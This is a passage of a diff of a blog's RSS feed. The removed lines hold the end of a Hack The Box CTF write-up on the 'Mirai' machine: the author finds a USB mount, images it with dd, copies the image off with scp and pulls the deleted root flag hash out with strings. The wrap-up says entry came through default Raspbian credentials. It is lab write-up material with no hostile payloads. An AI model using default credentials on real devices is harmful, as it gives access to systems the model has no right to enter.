-I lost my original root.txt! I think I may have a backup on my USB stick...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;It was almost a ‘not so fast, young man’. That engaged me more on the challenge.&lt;/p&gt;
-
-&lt;p&gt;To find the mounted partitions, I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;df -h&lt;/code&gt;&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@raspberrypi:~# df -h
-Filesystem      Size  Used Avail Use% Mounted on
-aufs            8.5G  2.8G  5.3G  35% /
-tmpfs           101M   13M   88M  13% /run
-/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1
-/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs
-tmpfs           251M     0  251M   0% /lib/live/mount/overlay
-/dev/sda2       8.5G  2.8G  5.3G  35% /lib/live/mount/persistence/sda2
-devtmpfs         10M     0   10M   0% /dev
-tmpfs           251M  8.0K  251M   1% /dev/shm
-tmpfs           5.0M  4.0K  5.0M   1% /run/lock
-tmpfs           251M     0  251M   0% /sys/fs/cgroup
-tmpfs           251M  8.0K  251M   1% /tmp
-/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
-tmpfs            51M     0   51M   0% /run/user/999
-tmpfs            51M     0   51M   0% /run/user/1000&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;There you are.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@raspberrypi:~# cd /media/usbstick
-root@raspberrypi:/media/usbstick# ls
-damnit.txt  lost+found
-root@raspberrypi:/media/usbstick# cat damnit.txt 
-Damnit! Sorry man I accidentally deleted your files off the USB stick.
-Do you know if there is any way to get them back?
-
--James&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Damn it, James! &lt;code class=&quot;highlighter-rouge&quot;&gt;lost+found&lt;/code&gt; had nothing. Well, maybe James tried to recover the file. Let’s check the &lt;code class=&quot;highlighter-rouge&quot;&gt;history&lt;/code&gt; (only the relevant info is shown).&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@raspberrypi:/media/usbstick/lost+found# history
-   39  extundelete 
-   58  cd .local/
-   60  cd share/
-   62  cd Trash/
-   64  cd files/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;I &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt;‘ed &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/pi/.local/share/Trash/files&lt;/code&gt; but there was nothing relevant. Let’s try this &lt;code class=&quot;highlighter-rouge&quot;&gt;extundelete&lt;/code&gt; command.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@raspberrypi:/media/usbstick/lost+found# extundelete -h
-bash: extundelete: command not found&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;I naïvely tried installing it via &lt;code class=&quot;highlighter-rouge&quot;&gt;apt&lt;/code&gt;. The box couldn’t communicate with the outer-world.&lt;/p&gt;
-
-&lt;p&gt;I searched about &lt;code class=&quot;highlighter-rouge&quot;&gt;extundelete&lt;/code&gt; and found it’s sourceforce page, where I spent a few minutes learning about it. That’s when I saw:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Typically, you would replace &quot;partition&quot; in the above examples by a device name like &quot;sda4&quot; or &quot;hdb7&quot;. When either of those commands successfully completes, you can now take the next steps leisurely - you will no longer make anything worse by waiting. If you would like to make a backup of your partition, you may do so by a command such as:
-$ dd bs=4M if=/dev/partition of=partition.backup&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;It made a lot of sense. If I could make a backup of the usb stick and download it, I could mount the backup it on my machine and run &lt;code class=&quot;highlighter-rouge&quot;&gt;extundelete&lt;/code&gt; locally, since it was only 8MB (check &lt;code class=&quot;highlighter-rouge&quot;&gt;df -h&lt;/code&gt; output) and it could be downloaded easily. And so I proceeded. I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;dd if=/dev/sdb of=usb_backup bs=1M&lt;/code&gt; and downloaded it via &lt;code class=&quot;highlighter-rouge&quot;&gt;scp&lt;/code&gt;.&lt;br /&gt;
-Before searching the proper way to mount a file as a directory, why not run &lt;code class=&quot;highlighter-rouge&quot;&gt;strings usb_backup&lt;/code&gt;?&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# strings usb_backup
-&amp;gt;r &amp;amp;
-/media/usbstick
-lost+found
-root.txt
-damnit.txt
-&amp;gt;r &amp;amp;
-&amp;gt;r &amp;amp;
-/media/usbstick
-lost+found
-root.txt
-damnit.txt
-&amp;gt;r &amp;amp;
-/media/usbstick
-2]8^
-lost+found
-root.txt
-damnit.txt
-&amp;gt;r &amp;amp;
-3d3e483143ff12ec505d026fa13e020b
-Damnit! Sorry man I accidentally deleted your files off the USB stick.
-Do you know if there is any way to get them back?
--James&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;There you are, &lt;em&gt;root hash&lt;/em&gt;!&lt;/p&gt;
-
-&lt;h2 id=&quot;wrapping-up&quot;&gt;Wrapping up&lt;/h2&gt;
-&lt;p&gt;I was my first CTF machine, so some actions were naïve and I overthought a lot, that made me miss some kind of obvious stuff at first glance. It felt very good to start with an IP and work my way in using some knowledge I previously had, get a shell on the machine and finally some out-of-the-box thinking to find the root hash. If it wasn’t for the previously knowledge about the default credentials of Raspbian, it’d have taken a LOT of time to get in. . It motivated me more to keep working on these machines, gaining knowledge and having fun (and sometimes wanting to hit my head on the wall :)&lt;/p&gt;
-</description>
-				<pubDate>Sat, 03 Feb 2018 22:00:01 -0200</pubDate>
-				<link>/2018/02/htb-ctf-mirai</link>
-				<guid isPermaLink="true">/2018/02/htb-ctf-mirai</guid>
 			</item>
 		
 	</channel>
